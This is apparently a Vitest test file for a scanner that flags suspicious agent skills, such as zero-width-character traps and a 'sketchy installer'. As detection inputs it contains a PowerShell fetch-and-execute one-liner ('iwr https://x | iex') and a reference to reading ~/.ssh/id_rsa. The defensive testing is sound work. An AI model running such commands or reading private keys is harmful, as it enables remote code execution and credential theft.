import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { scanItemSecurity, scanText } from '../../src/analyze/security.js';
import { createContext } from '../../src/context.js';
import { buildInventory } from '../../src/discover/inventory.js';
import { FIXTURE_NOW, buildFixture, tempDir } from '../helpers/fixture.js';

describe('scanItemSecurity', () => {
  it('flags the trap skills and leaves Persian text alone', async () => {
    const home = await buildFixture('minimal', await tempDir('sw-sec-'));
    const ctx = createContext({
      home,
      cwd: path.join(home, 'projects', 'webapp'),
      now: FIXTURE_NOW,
      env: {},
      toolVersion: '0.0.0-test',
    });
    const inv = await buildInventory(ctx, (text) => text.length);
    const flags = new Map<string, string[]>();
    for (const item of inv.items) {
      flags.set(item.qualifiedName, (await scanItemSecurity(item)).map((flag) => flag.rule));
    }
    expect(flags.get('zw-trap')).toEqual(expect.arrayContaining(['SW001', 'SW002']));
    expect(flags.get('sketchy-installer')).toEqual(['SW004']);
    expect(flags.get('translate-fa')).toEqual([]);
    for (const [name, rules] of flags) {
      if (name === 'zw-trap' || name === 'sketchy-installer') continue;
      expect(rules, name).toEqual([]);
    }
  });

  it('ignores a leading BOM and flags remote shells and ssh paths', () => {
    expect(scanText('\uFEFFhello', 'a.md')).toEqual([]);
    expect(scanText('iwr https://x | iex', 'a.ps1').map((flag) => flag.rule)).toEqual(['SW004']);
    expect(scanText('never read ~/.ssh/id_rsa', 'a.md').map((flag) => flag.rule)).toContain('SW003');
  });
});
